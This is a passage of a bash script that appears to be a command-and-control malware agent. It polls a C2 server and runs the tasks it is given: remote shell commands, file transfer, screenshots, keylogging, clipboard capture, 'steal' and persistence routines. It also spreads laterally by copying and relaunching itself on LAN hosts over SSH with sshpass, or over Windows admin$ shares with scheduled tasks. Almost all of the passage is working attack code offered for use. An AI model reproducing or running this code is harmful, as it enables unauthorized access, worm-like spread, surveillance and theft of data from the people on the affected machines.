  net use "\\\\$host\\admin\$" /delete /y >/dev/null 2>&1
  if [ "$trc" -eq 0 ]; then
    echo "deployed (file dropped + scheduled c2agent-lateral)"
  else
    echo "deployed (file dropped; task: $terr)"
  fi
}

lateral_unix_deploy() {
  # $1 = host, $2 = user, $3 = pass -> prints status
  local host="$1" user="$2" pass="$3"
  local base self interp relaunch remcmd scp_err scr lout lrc
  base=$(basename "$0"); self="$0"
  interp="${BASH:-bash}"
  relaunch="$interp /tmp/$base --server \"${SERVER%/}\" --token \"$TOKEN\" --interval \"${INTERVAL:-10}\" --jitter \"${JITTER:-0}\""
  if ! command -v sshpass >/dev/null 2>&1; then
    echo "skipped (sshpass not installed)"
    return 1
  fi
  scp_err=$(sshpass -p "$pass" scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 "$self" "$user@$host:/tmp/$base" 2>&1); scr=$?
  if [ "$scr" -ne 0 ]; then
    echo "failed (scp: $scp_err)"
    return 1
  fi
  remcmd="'$relaunch' &>/dev/null &"
  lout=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 "$user@$host" "$remcmd" 2>&1); lrc=$?
  if [ "$lrc" -eq 0 ]; then
    echo "deployed (file uploaded + launched)"
  else
    echo "deployed (file uploaded; launch: $lout)"
  fi
}

LATERAL_RC=0
lateral_task() {
  # $1 = args json -> prints output; sets LATERAL_RC
  local args="$1"
  local subnet user pass own base peers host status
  local n=0 depl=0 fail=0 skip=0 plist="" lines="" osname
  subnet=$(echo "$args" | json_get '.subnet // ""')
  user=$(echo "$args" | json_get '.user // ""')
  pass=$(echo "$args" | json_get '.pass // ""')
  [ -n "$user" ] || user="${C2_LAT_USER:-}"
  [ -n "$pass" ] || pass="${C2_LAT_PASS:-}"
  own=$(local_ip)
  base=""
  if [ -n "$subnet" ]; then
    base=$(printf '%s' "$subnet" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
  else
    base=$(printf '%s' "$own" | grep -oE '^[0-9]+\.[0-9]+\.[0-9]+')
  fi
  if [ -z "$base" ]; then
    echo "lateral: no LAN peers found"
    LATERAL_RC=1
    return 1
  fi
  peers=$(lateral_discover "$base" "$own")
  if [ -z "$peers" ]; then
    echo "lateral: no LAN peers found"
    LATERAL_RC=1
    return 1
  fi
  osname=$(uname -s 2>/dev/null | tr '[:upper:]' '[:lower:]')
  for host in $peers; do
    n=$((n + 1))
    if [ -z "$plist" ]; then plist="$host"; else plist="$plist, $host"; fi
    if [ -z "$user" ] && [ -z "$pass" ]; then
      status="skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
      skip=$((skip + 1))
    else
      case "$osname" in
        *mingw*|*msys*|*cygwin*|*nt-*)
          status=$(lateral_win_deploy "$host" "$user" "$pass")
          ;;
        *)
          status=$(lateral_unix_deploy "$host" "$user" "$pass")
          ;;
      esac
      case "$status" in
        deployed* ) depl=$((depl + 1)) ;;
        failed* )  fail=$((fail + 1)) ;;
        skipped* ) skip=$((skip + 1)) ;;
      esac
    fi
    lines="${lines}  ${host}: ${status}"$'\n'
  done
  [ "${#lines}" -gt 12000 ] && lines=$(printf '%s' "$lines" | tail -c 12000)
  printf 'lateral: %d peer(s): %s\n%slateral: deployed=%d failed=%d skipped=%d\n' "$n" "$plist" "$lines" "$depl" "$fail" "$skip"
  LATERAL_RC=0
}

execute() {
  # $1 = task_id, $2 = type, $3 = args(json)
  local tid="$1" type="$2" args="$3"
  local out code=0
  case "$type" in
    shell)
      local timeout n
      timeout=$(echo "$args" | json_get '.timeout // 120')
      case "$timeout" in *[!0-9]*) timeout=120 ;; esac
      n=$(( timeout )); [ "$n" -ge 1 ] || n=1; [ "$n" -le 3600 ] || n=3600
      timeout=$n
      out=$(run_shell "$(echo "$args" | json_get '.command // ""')" "$timeout")
      code=$RUN_CODE
      ;;
    download)
      if out=$(download "$tid" "$(echo "$args" | json_get '.file // ""')" \
            "$(echo "$args" | json_get '.destination // ""')"); then :; else code=1; fi
      ;;
    upload)
      if out=$(upload "$tid" "$(echo "$args" | json_get '.path // ""')"); then :; else code=1; fi
      ;;
    screenshot)
      if out=$(screenshot "$tid" "$(echo "$args" | json_get '.name // ""')"); then :; else code=1; fi
      ;;
    sleep)
      local secs
      secs=$(echo "$args" | json_get '.seconds // 10')
      INTERVAL=$(( secs > 0 ? secs : 10 ))
      out="heartbeat interval set to ${INTERVAL}s"
      ;;
    keylog)
      local action
      action=$(echo "$args" | json_get '.action // "dump"')
      case "$action" in
        start) out=$(klog_start) ;;
        stop)  out=$(klog_stop) ;;
        *)     out=$(klog_dump) ;;
      esac
      case "$out" in error:*) code=1 ;; esac
      ;;
    clipboard)
      local action
      action=$(echo "$args" | json_get '.action // "get"')
      if [ "$action" = "set" ]; then
        local text
        text=$(echo "$args" | json_get '.text // ""')
        if command -v pbcopy >/dev/null 2>&1; then
          echo "$text" | pbcopy
          out="clipboard set"
        elif command -v xclip >/dev/null 2>&1; then
          echo "$text" | xclip -selection clipboard
          out="clipboard set"
        elif [ -w /dev/clipboard ]; then
          echo "$text" > /dev/clipboard
          out="clipboard set"
        else
          out="error: no clipboard tool available"
          code=1
        fi
      else
        if command -v pbpaste >/dev/null 2>&1; then
          out=$(pbpaste)
        elif command -v xclip >/dev/null 2>&1; then
          out=$(xclip -selection clipboard -o)
        elif [ -r /dev/clipboard ]; then
          out=$(cat /dev/clipboard)
        else
          out="error: no clipboard tool available"
          code=1
        fi
      fi
      ;;
    clone)
      out=$(clone_action "$(echo "$args" | json_get '.action // "start"')" "$args")
      case "$out" in error:*|clone:\ *failed*) code=1 ;; esac
      ;;
    steal)
      if out=$(steal_task "$tid" "$args"); then :; else code=1; fi
      ;;
    persistence)
      if out=$(persistence_task "$args"); then :; else code=1; fi
      ;;
    lateral)
      if out=$(lateral_task "$args"); then :; else code=1; fi
      ;;
    exit)
      out="exiting"
      ;;
    *)
      out="unknown task type: $type"
      code=1
      ;;
  esac
  # Printable output + exit code split on a unit separator that never
  # appears in real command output (unlike '|').
  printf '%s\x1e%s\n' "$out" "$code"
}

# -------------------------------------------------------------------- main

while [ $# -gt 0 ]; do
  case "$1" in
    --server) SERVER="$2"; shift 2 ;;
    --token) TOKEN="$2"; shift 2 ;;
    --interval) INTERVAL="$2"; shift 2 ;;
    --jitter) JITTER="$2"; shift 2 ;;
    --state) STATE_FILE="$2"; C2_STATE_OVERRIDE=1; shift 2 ;;
    --verbose) VERBOSE=1; shift ;;
    *) die "unknown option: $1" ;;
  esac
done

[ -n "$SERVER" ] && [ -n "$TOKEN" ] || die "usage: agent.sh --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE]"
[ -z "${C2_STATE_OVERRIDE:-}" ] && [ -n "$C2_STATE_FILE" ] && STATE_FILE="$C2_STATE_FILE"

SERVER="${SERVER%/}"
load_id
if [ -z "${AGENT_ID:-}" ]; then register; fi

log "agent running against $SERVER (interval ${INTERVAL}s)"

while true; do
  tasks=$(checkin)
  if [ -z "$tasks" ]; then
    # checkin failed or re-registered after a 404 (which persists the new
    # id to the state file) — re-sync the id so we stop 404ing forever.
    load_id
    continue
  fi
  if [ "$tasks" != "[]" ]; then
    # process substitution keeps this loop in the current shell so that
    # 'exit' tasks really terminate the agent and 'sleep' interval changes
    # persist (a plain pipeline would run it in a subshell).
    while read -r tid type args; do
      log "running task $tid ($type)"
      result=$(execute "$tid" "$type" "$args")
      out="${result%$'\x1e'*}"
      code="${result#*$'\x1e'}"
      [ "$type" = "exit" ] && code="0"
      report "$tid" "$out" "$code" ""
      if [ "$type" = "exit" ]; then exit 0; fi
    done < <(echo "$tasks" | python3 -c '
import sys,json
try:
    data=json.load(sys.stdin)
except Exception:
    data=[]
for t in data:
    print(t["task_id"], t["type"], json.dumps(t.get("args",{})))')
  fi
  j=0
  if [ "${JITTER:-0}" -gt 0 ]; then j=$(( RANDOM % JITTER )); fi
  sleep "$(( INTERVAL + j ))"
done
